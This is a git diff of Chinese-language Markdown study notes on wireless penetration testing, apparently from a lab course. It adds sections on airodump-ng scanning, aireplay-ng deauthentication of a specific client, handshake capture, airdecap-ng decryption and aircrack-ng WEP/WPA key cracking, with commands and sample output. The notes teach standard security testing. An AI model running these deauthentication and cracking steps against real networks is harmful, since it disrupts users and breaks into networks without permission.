@@ -185,7 +185,7 @@ Wiphy phy5
 iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'
           Cell 01 - Address: f0:28:c8:d9:9c:6e
                     Quality=61/70  Signal level=-49 dBm
-                    ESSID:"HTB-Wireless"
+                    ESSID:"WIFI-Wireless"
                     IE: IEEE 802.11i/WPA2 Version 1
           Cell 02 - Address: 3a:c4:6e:40:09:76
                     Quality=70/70  Signal level=-30 dBm
@@ -312,7 +312,7 @@ sudo iwconfig wlan0 essid MYWIFI
 
 ```
 sudo iwconfig
-wlan0     IEEE 802.11  ESSID:"HTB-Mesh"
+wlan0     IEEE 802.11  ESSID:"WIFI-Mesh"
           Mode:Ad-Hoc  Frequency:2.412 GHz  Cell: Not-Associated
           Tx-Power=30 dBm
           Retry short  long limit:2   RTS thr:off   Fragment thr:off
@@ -417,7 +417,6 @@ Aircrack-ng 的功能有：
 - **测试 (Testing)**：检查 Wi-Fi 网卡和驱动程序的功能（捕获和注入）。
 - **破解 (Cracking)**：WEP 和 WPA PSK (WPA 1 和 2)。
 
-
 |   **工具**    |                       **描述**                        |
 | :---------: | :-------------------------------------------------: |
 |  Airmon-ng  |             Airmon-ng 可以启用和禁用无线接口的监听模式。             |
@@ -426,7 +425,6 @@ Aircrack-ng 的功能有：
 | Aireplay-ng |                Aireplay-ng 可以生成无线流量。                |
 | Airdecap-ng |    Airdecap-ng 可以解密 WEP、WPA PSK 或 WPA2 PSK 捕获文件。    |
 | Aircrack-ng | Aircrack-ng 可以破解使用预共享密钥或 PMKID 的 WEP 和 WPA/WPA2 网络。 |
-
 
 ### Airmon-ng
 
@@ -553,10 +551,446 @@ wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
           Power Management:off
 ```
 
+### Airodump-ng
+
+Airodump-ng 用作数据包捕获工具，专门针对原始 802.11 帧。
+
+| **字段**  |              **描述**               |
+| :-----: | :-------------------------------: |
+|  BSSID  |          显示接入点的 MAC 地址。           |
+|   PWR   |      显示网络的“功率”。数字越高，信号强度越好。       |
+| Beacons |           显示网络发送的广播包数量。           |
+|  Data   |            显示捕获的数据包数量。            |
+|   /s    |         显示过去十秒内捕获的数据包数量。          |
+|   CH    |           显示网络运行的“信道”。            |
+|   MB    |           显示网络支持的最大速度。            |
+|   ENC   |           显示网络使用的加密方法。            |
+| CIPHER  |           显示网络使用的加密算法。            |
+|  AUTH   |           显示网络使用的认证方法。            |
+|  ESSID  |             显示网络的名称。              |
+| STATION |       显示连接到网络的客户端的 MAC 地址。        |
+|  RATE   |        显示客户端与接入点之间的数据传输速率。        |
+|  LOST   |            显示丢失的数据包数量。            |
+| Packets |          显示客户端发送的数据包数量。           |
+|  Notes  | 显示有关客户端的附加信息，例如捕获的 EAPOL 或 PMKID。 |
+| PROBES  |          显示客户端正在探测的网络列表。          |
+
+为了利用 airodump-ng，第一步是在无线接口上激活监听模式。此模式允许接口捕获其附近的全部无线流量。可以使用 airmon-ng 在接口上启用监听模式，如前一节所示。
+
+```bash
+sudo airmon-ng start wlan0mon
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+```
+
+启动后，生成的表格下方显示的 stations 代表连接到 Wi-Fi 网络的客户端。
+
+#### 扫描特定信道或单个信道
+
+命令 `airodump-ng wlan0mon` 启动全面扫描，收集所有可用信道上的无线接入点数据。然而，可以使用 `-c` 选项指定特定信道，将扫描集中在某个频率上。例如，`-c 11` 将扫描范围缩小到信道 11。这种有针对性的方法可以提供更精确的结果，尤其是在拥挤的 Wi-Fi 环境中。
+
+也可以使用命令 `airodump-ng -c 1,6,11 wlan0mon` 选择多个信道进行扫描。
+
+#### 扫描 5 GHz Wi-Fi 频段
+
+默认情况下，airodump-ng 配置为仅扫描在 2.4 GHz 频段上运行的网络。但是，如果无线适配器兼容 5 GHz 频段，可以使用 `--band` 选项。
+
+|频段|频率|
+|:--|:--|
+|a|5 GHz|
+|b|2.4 GHz|
+|g|2.4 GHz|
+
+```bash
+sudo airodump-ng wlan0mon --band a
+CH  48 ][ Elapsed: 1 min ][ 2024-05-18 17:41 ][
+                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+ 00:14:6C:7A:41:81   34 100       57       14    1  48  11e  WPA  TKIP        WIFI
+
+BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes
+
+ (not associated)   00:0F:B5:32:31:31  -29    0      42        4
+ (not associated)   00:14:A4:3F:8D:13  -29    0       0        4
+ (not associated)   00:0C:41:52:D1:D1  -29    0       0        5
+ (not associated)   00:0F:B5:FD:FB:C2  -29    0       0       22
+```
+
+使用 `--band` 选项时，可以根据扫描需求灵活指定单个频段或多个频段的组合。例如，要扫描所有可用频段，可以执行命令 `airodump-ng --band abg wlan0mon`。此命令指示 airodump-ng 同时扫描 a、b 和 g 频段上的网络。
+
+#### 将输出保存到文件
+
+可以通过使用 `--write <prefix>` 参数来保存 `airodump-ng` 扫描的结果。此操作将生成多个以指定前缀命名的文件。例如，执行 `airodump-ng wlan0mon --write MYWIFI` 将在当前目录中生成多个以`MYWIFI`开头的文件。
+
+### Airgraph-ng
+
+Airgraph-ng 是一个 Python 脚本，旨在利用 Airodump-ng 生成的 CSV 文件生成无线网络的图形化表示。Airodump-ng 生成的这些 CSV 文件捕获了关于无线客户端与接入点（AP）之间关联以及探测到的网络清单的关键数据。Airgraph-ng 处理这些 CSV 文件以生成两种不同类型的图表：
+
+- 客户端与 AP 关系图 (Clients to AP Relationship Graph)：此图表描绘了无线客户端与接入点之间的连接，提供了对网络拓扑和设备之间交互的洞察。
+- 客户端探测图 (Clients Probe Graph)：此图表展示了无线客户端探测到的网络，直观地描绘了这些设备扫描并可能尝试访问的网络。
+
+通过利用 Airgraph-ng，用户可以可视化和分析无线网络内的关系和交互，有助于网络故障排除、优化和安全评估。
+
+#### 客户端与 AP 关系图 (Clients to AP Relationship Graph)
+
+客户端与 AP 关系（CAPR）图表描绘了客户端与接入点（AP）之间的连接。由于此图表强调客户端，它将不会显示任何没有连接客户端的 AP。
+
+接入点根据其加密类型进行颜色编码：
+
+- 绿色表示 WPA
+- 黄色表示 WEP
+- 红色表示开放网络
+- 黑色表示未知加密
+
+```bash
+sudo airgraph-ng -i WIFI.csv -g CAPR -o WIFI_CAPR.png
+**** WARNING Images can be large, up to 12 Feet by 12 Feet****
+Creating your Graph using, WIFI.csv and writing to, WIFI_CAPR.png
+Depending on your system this can take a bit. Please standby......
+```
+![[Pasted image 20250514013224.png]]
+
+#### 客户端探测图 (Common Probe Graph)
+
+Airgraph-ng 中的客户端探测图（CPG）可视化了无线客户端与其探测的接入点（AP）之间的关系。它通过显示客户端发出的探测，展示了每个客户端正在尝试连接哪些 AP。此图表有助于识别哪些客户端正在探测哪些网络，即使它们当前未连接到任何 AP。
+
+```bash
+sudo airgraph-ng -i WIFI.csv -g CPG -o WIFI_CPG.png
+**** WARNING Images can be large, up to 12 Feet by 12 Feet****
+Creating your Graph using, WIFI.csv and writing to, WIFI_CPG.png
+Depending on your system this can take a bit. Please standby......
+```
+
+![[Pasted image 20250514013303.png]]
+
+## Aireplay-ng
+
+Aireplay-ng 的主要功能是生成流量，以便后续用于 aircrack-ng 破解 WEP 和 WPA-PSK 密钥。它包含多种攻击类型，可以用于解除认证以捕获 WPA 握手数据、伪造认证、交互式数据包重放、手工构造 ARP 请求注入和 ARP 请求重注入。使用 packetforge-ng 工具可以创建任意帧。
+
+
+```bash
+aireplay-ng
+Attack modes (numbers can still be used):
+...
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+      --arpreplay         : standard ARP-request replay (-3)
+      --chopchop          : decrypt/chopchop WEP packet (-4)
+      --fragment          : generates valid keystream   (-5)
+      --caffe-latte       : query a client for new IVs  (-6)
+      --cfrag             : fragments against a client  (-7)
+      --migmode           : attacks WPA migration mode  (-8)
+      --test              : tests injection and quality (-9)
+
+      --help              : Displays this usage screen
+```
+
+| **攻击编号** |                     **攻击名称**                      |
+| :------: | :-----------------------------------------------: |
+| Attack 0 |             解除认证攻击 (Deauthentication)             |
+| Attack 1 |           伪造认证攻击 (Fake authentication)            |
+| Attack 2 |       交互式数据包重放 (Interactive packet replay)        |
+| Attack 3 |      ARP 请求重放攻击 (ARP request replay attack)       |
+| Attack 4 |                 KoreK chopchop 攻击                 |
+| Attack 5 |            分段攻击 (Fragmentation attack)            |
+| Attack 6 |                   Cafe-latte 攻击                   |
+| Attack 7 | 面向客户端的分段攻击 (Client-oriented fragmentation attack) |
+| Attack 8 |          WPA 迁移模式攻击 (WPA Migration Mode)          |
+| Attack 9 |               注入测试 (Injection test)               |
+
+可以看到，解除认证的标志是 `-0` 或 `--deauth`。此攻击可用于将客户端从接入点 (AP) 断开。通过使用 `aireplay-ng`，可以向 AP 发送解除认证数据包。AP 会误认为这些解除认证请求来自客户端本身，而实际上，是我们在发送它们。
+
+#### 测试数据包注入
+
+在发送解除认证帧之前，验证无线网卡是否能成功将帧注入目标接入点 (AP) 非常重要。可以通过测量从 AP 返回的 ping 响应时间来测试，这基于收到的响应百分比，可以了解链路质量。
+
+启用监听模式并将接口的信道设置为 1。可以使用命令 `airmon-ng start wlan0 1` 来完成此操作。或者，可以使用 `iw` 命令设置信道，如下所示：
+
+
+```bash
+sudo iw dev wlan0mon set channel 1
+```
+
+
+```bash
+sudo aireplay-ng --test wlan0mon
+12:34:56  Trying broadcast probe requests...
+12:34:56  Injection is working!
+12:34:56  Found 27 APs
+12:34:56  Trying directed probe requests...
+12:34:56   00:09:5B:1C:AA:1D - channel: 1 - 'TOMMY'
+12:34:56  Ping (min/avg/max): 0.457ms/1.813ms/2.406ms Power: -48.00
+12:34:56  30/30: 100%
+<SNIP>
+```
+
+如果一切正常，应看到消息 `Injection is working!` 这表明接口支持数据包注入，并且已准备好使用 `aireplay-ng` 执行解除认证攻击。
+
+#### 使用 Aireplay-ng 执行解除认证
+
+首先，使用` airodump-ng `查看可用的 Wi-Fi 网络，即接入点 (AP)。
+
+```bash
+sudo airodump-ng wlan0mon
+CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][
+                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+ 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              Redmi
+ 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  WIFI_1
+ 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  TPLINK
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           WIFI_1
+ (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           WIFI_1
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           TPLINK
+```
+
+从以上输出可以看到，有三个可用的 Wi-Fi 网络，并且有两个客户端连接到名为 WIFI 的网络。向其中一个站点 ID 为 00:0F:B5:32:31:31 的客户端发送解除认证请求。
+
+```bash
+sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
+11:12:33  Waiting for beacon frame (BSSID: 00:14:6C:7A:41:81) on channel 1
+11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:36  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+```
+
+- `-0` 表示解除认证。
+- `5` 是要发送的解除认证次数（可以发送多次）；`0` 表示连续发送。
+- `-a 00:14:6C:7A:41:81` 是接入点的 MAC 地址。
+- `-c 00:0F:B5:32:31:31` 是要解除认证的客户端的 MAC 地址；如果省略此项，则所有客户端都会被解除认证。
+- `wlan0mon` 是接口名称。
+
+客户端从 AP 解除认证后，可以继续观察 `airodump-ng`，看它们何时重新连接。
+
+Bash
+
+```
+sudo airodump-ng wlan0mon
+CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
+                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+ 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              Redmi
+ 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  WIFI_1
+ 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  TPLINK
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  WIFI_1
+ (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          WIFI_1
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          TPLINK
+```
+
+在上面的输出中，可以看到发送解除认证数据包后，客户端断开连接然后重新连接。这由 `Lost` 数据包数量和 `Frames` 计数增加所证明。
+
+此外，`airodump-ng` 会捕获一个四次握手（four-way handshake），如输出中所示。通过在 airodump-ng 中使用 `-w` 选项，可以将捕获的 WPA 握手保存到 `.pcap` 文件中。此文件随后可用于像 aircrack-ng 这样的工具来破解预共享密钥 (PSK)。`[ WPA handshake: 00:14:6C:7A:41:81]`是必须的。如果没有出现这个，那就无法进行破解。
+
+### Airdecap-ng
+
+Airdecap-ng 是一个有价值的工具，一旦获取了网络的密钥，就可用于解密无线捕获文件。它可以解密 WEP、WPA PSK 和 WPA2 PSK。
+
+- 从开放网络捕获（未加密捕获）中移除无线头部。
+- 使用十六进制 WEP 密钥解密 WEP 加密捕获文件。
+- 使用预共享密码解密 WPA/WPA2 加密捕获文件。
+
+用法：`airdecap-ng [options] <pcap file>`
+
+| **选项** |                   **描述**                    |
+| :----: | :-----------------------------------------: |
+|   -l   |                不移除 802.11 头部                |
+|   -b   |                接入点 MAC 地址过滤器                |
+|   -k   | WPA/WPA2 成对主密钥 (Pairwise Master Key)，十六进制格式 |
+|   -e   |           目标网络 ASCII 标识符 (ESSID)            |
+|   -p   |      目标网络 WPA/WPA2 预共享密码 (passphrase)       |
+|   -w   |             目标网络 WEP 密钥，十六进制格式              |
+
+Airdecap-ng 生成一个新文件，其后缀为 `-dec.cap`。
+
+在使用 airdecap-ng 解密后的捕获文件中，可以看到 "Protocol" 选项卡显示了正确的协议，例如 ARP、TCP、DHCP、HTTP 等。此外，注意 "Info" 选项卡提供了更详细的信息，并且正确显示了源和目标 IP 地址。
+
+#### 从未加密捕获文件中移除无线头部
+
+在开放网络上捕获数据包会生成一个未加密的捕获文件。它可能包含许多与我们的分析无关的帧。为了精简数据，可以使用 airdecap-ng 消除未加密捕获文件中的无线头部。
+
+可以使用以下命令：`airdecap-ng -b <bssid> <capture-file>`
+
+将 `<bssid>` 替换为接入点的 MAC 地址，将 `<capture-file>` 替换为捕获文件的名称。
+
+```bash
+sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap
+Total number of stations seen            0
+Total number of packets read           251
+Total number of WEP data packets         0
+Total number of WPA data packets         0
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets         0
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+```
+
+这将生成一个后缀为 `-dec.cap` 的解密文件，例如 `opencapture-dec.cap`，其中包含已精简的数据，可供进一步分析。
+
+#### 解密 WEP 加密捕获
+
+一旦获取了十六进制 WEP 密钥，就可以用它来解密捕获的数据包。
+
+要使用 Airdecap-ng 解密 WEP 加密捕获文件，可以使用以下命令：`airdecap-ng -w <WEP-key> <capture-file>`
+
+将 `<WEP-key>` 替换为十六进制 WEP 密钥，将 `<capture-file>` 替换为捕获文件的名称。
+
+```bash
+sudo airdecap-ng -w 1234567890ABCDEF WIFI-01.cap
+Total number of stations seen            6
+Total number of packets read           356
+Total number of WEP data packets       235
+Total number of WPA data packets       121
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       235
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+```
+
+这将生成一个后缀为 `-dec.cap` 的解密文件。
+
+#### 解密 WPA 加密捕获
+
+Airdecap-ng 也可以解密 WPA 加密捕获文件，前提是拥有预共享密码。
+
+可以使用以下命令：`airdecap-ng -p <passphrase> <capture-file> -e <essid>`
+
+将 `<passphrase>` 替换为 WPA 预共享密码，将 `<capture-file>` 替换为捕获文件的名称，将 `<essid>` 替换为相应网络的 ESSID 名称。
+
+```bash
+sudo airdecap-ng -p 'abdefg' WIFI-01.cap -e "THE ESSID"
+Total number of stations seen            6
+Total number of packets read           356
+Total number of WEP data packets       235
+Total number of WPA data packets       121
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       121
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+```
+
+这将生成一个后缀为 `-dec.cap` 的解密文件。
+### Aircrack-ng
+
+Aircrack-ng 是一个功能强大的网络安全测试工具，能够破解使用预共享密钥或 PMKID 的 WEP 和 WPA/WPA2 网络。Aircrack-ng 是一个离线攻击工具，因为它处理捕获的数据包，无需与任何 Wi-Fi 设备直接交互。
+
+####  基准测试
+
+在开始使用 Aircrack-ng 进行密码破解之前，评估主机系统的基准性能至关重要，以确保其能够有效执行暴力破解攻击。Aircrack-ng 具有基准测试模式，用于测试 CPU 性能。
+
+```bash
+aircrack-ng -S
+1628.101 k/s
+```
+
+以上输出估计 CPU 每秒可以破解约 1,628.101 个密码。
+
+#### 破解 WEP
+
+一旦使用 Airodump-ng 捕获了足够数量的加密数据包，Aircrack-ng 就能够恢复 WEP 密钥。可以使用 Airodump-ng 的 `--ivs` 选项仅保存捕获的` IV（Initialization Vectors，初始化向量）`。捕获足够的 IV 后，可以使用 `Aircrack-ng` 的 `-K` 选项，它会调用 `Korek WEP `破解方法来破解 WEP 密钥。
+
+```bash
+aircrack-ng -K WIFI.ivs
+Reading packets, please wait...
+Opening WIFI.ivs
+Read 567298 packets.   #  BSSID              ESSID                     Encryption   1  D2:13:94:21:7F:1A                            WEP (0 IVs)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening WIFI.ivs
+Read 567298 packets.
+
+1 potential targets
+
+                                             Aircrack-ng 1.6
+
+
+                               [00:00:17] Tested 1741 keys (got 566693 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   EB(  50) 11(  20) 71(  20) 0D( 12) 10( 12) 68( 12) 84( 12) 0A(   9)
+    1    1/  2   C8(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13)
+    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10)
+    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12)
+    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10)
+    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17)
+    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11)
+    7    0/  1   DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16)
+    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16)
+    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17)
+   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0)
+
+             KEY FOUND! [ EB:C8:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
+	Decrypted correctly: 100%
+```
+
+#### 破解 WPA
+
+一旦使用 Airodump-ng 捕获到“四次握手”，Aircrack-ng 就能够破解 WPA 密钥。要破解 WPA/WPA2 预共享密钥，只能使用基于字典的方法，这需要一个包含潜在密码的词典。一个“四次握手”作为必要的输入。对于 WPA 握手，完整的握手包含四个数据包。然而，Aircrack-ng 仅用两个数据包也能有效工作。具体来说，EAPOL 数据包 2 和 3，或数据包 3 和 4，被视为完整握手。
+
+```bash
+aircrack-ng WIFI.pcap -w /opt/wordlist.txt
+Reading packets, please wait...
+Opening WIFI.pcap
+Read 1093 packets.   #  BSSID              ESSID                     Encryption   1  2D:0C:51:12:B2:33  WIFI-Wireless              WPA (1 handshake, with PMKID)
+   2  DA:28:A7:B7:30:84                            Unknown
+   3  53:68:F7:B7:51:B9                            Unknown
+   4  95:D1:46:23:5A:DD                            Unknown
 
 
 
+Index number of target network ? 1
 
+Reading packets, please wait...
+Opening WIFI.pcap
+Read 1093 packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.6
+
+      [00:00:00] 802/14344392 keys tested (2345.32 k/s)
+
+      Time left: 1 hour, 41 minutes, 55 seconds                  0.01%
+
+                           KEY FOUND! [ WIFI@123 ]
+
+
+      Master Key     : A2 88 FC F0 CA AA CD A9 A9 F5 86 33 FF 35 E8 99
+                       2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+      EAPOL HMAC     : A4 62 A7 02 9A D5 BA 30 B6 AF 0D F3 91 98 8E 45
+```
 ## Cheetsheet
 #### Interfaces
 
@@ -568,7 +1002,7 @@ wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
 |  `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 channel 64`  <br>`sudo ifconfig wlan0 up`   |   Change the Interface Channel.    |
 | `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 freq "5.52G"`  <br>`sudo ifconfig wlan0 up`  |  Change the Interface Frequency.   |
 | `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 mode managed`  <br>`sudo ifconfig wlan0 up`  | Set the Interface to Managed Mode. |
-|            `sudo iwconfig wlan0 mode ad-hoc`  <br>`sudo iwconfig wlan0 essid HTB-Mesh`            | Set the Interface to Ad-hoc Mode.  |
+|            `sudo iwconfig wlan0 mode ad-hoc`  <br>`sudo iwconfig wlan0 essid WIFI-Mesh`            | Set the Interface to Ad-hoc Mode.  |
 |                                 `sudo iw dev wlan0 set type mesh`                                 |  Set the Interface to Mesh Mode.   |
 | `sudo ifconfig wlan0 down`  <br>`sudo iw wlan0 set monitor control`  <br>`sudo ifconfig wlan0 up` | Set the Interface to Monitor Mode. |
 
@@ -581,14 +1015,14 @@ wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
 |                      `sudo airodump-ng wlan0mon`                      |                     Scan Available WiFi Networks using airodump-ng.                      |
 |                   `sudo airodump-ng -c 11 wlan0mon`                   | Scan Available WiFi Networks using airodump-ng on Specific Channels or a Single Channel. |
 |                 `sudo airodump-ng wlan0mon --band a`                  |                                 Scan 5 GHz Wi-Fi bands.                                  |
-|                  `sudo airodump-ng wlan0mon -w HTB`                   |                          Save the airodump-ng output to a file.                          |
-|          `airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png`          |                            Clients to AP Relationship Graph.                             |
-|           `airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png`           |                                   Common Probe Graph.                                    |
+|                  `sudo airodump-ng wlan0mon -w WIFI`                   |                          Save the airodump-ng output to a file.                          |
+|          `airgraph-ng -i WIFI-01.csv -g CAPR -o WIFI_CAPR.png`          |                            Clients to AP Relationship Graph.                             |
+|           `airgraph-ng -i WIFI-01.csv -g CPG -o WIFI_CPG.png`           |                                   Common Probe Graph.                                    |
 |                  `sudo aireplay-ng --test wlan0mon`                   |                                Test for Packet Injection.                                |
 | `aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon` |                        Perform Deauthentication using Aireplay-ng                        |
-|             `airdecap-ng -w 1234567890ABCDEF HTB-01.cap`              |                             Decrypt WEP-encrypted captures.                              |
-|                       `aircrack-ng -K HTB.ivs`                        |                             Cracking WEP using aircrack-ng.                              |
-|              `aircrack-ng HTB.pcap -w /opt/wordlist.txt`              |                             Cracking WPA using aircrack-ng.                              |
+|             `airdecap-ng -w 1234567890ABCDEF WIFI-01.cap`              |                             Decrypt WEP-encrypted captures.                              |
+|                       `aircrack-ng -K WIFI.ivs`                        |                             Cracking WEP using aircrack-ng.                              |
+|              `aircrack-ng WIFI.pcap -w /opt/wordlist.txt`              |                             Cracking WPA using aircrack-ng.                              |
 
 ### Connection
 
@@ -596,7 +1030,7 @@ wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
 | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :--------------------------------: |
 |              `network={`  <br>   `ssid="HackTheBox"`  <br>   `key_mgmt=NONE`  <br>   `wep_key0=3C1C3A3BAB`  <br>   `wep_tx_keyidx=0`  <br>`}`  <br>`wpa_supplicant -c wep.conf -i wlan0`              |      Connect to WEP Networks       |
 |                                          `network={`  <br>   `ssid="HackMe"`  <br>   `psk="password123"`  <br>`}`  <br>`wpa_supplicant -c wpa.conf -i wlan0`                                          |  Connect to WPA Personal Networks  |
-| `network={`  <br>   `ssid="HTB-Corp"`  <br>   `key_mgmt=WPA-EAP`  <br>   `identity="HTB\Administrator"`  <br>   `password="Admin@123"`  <br>`}`  <br>`wpa_supplicant -c wpa_enterprsie.conf -i wlan0` | Connect to WPA Enterprise Networks |
+| `network={`  <br>   `ssid="WIFI-Corp"`  <br>   `key_mgmt=WPA-EAP`  <br>   `identity="WIFI\Administrator"`  <br>   `password="Admin@123"`  <br>`}`  <br>`wpa_supplicant -c wpa_enterprsie.conf -i wlan0` | Connect to WPA Enterprise Networks |
 
 ### Basic Control Bypass
 
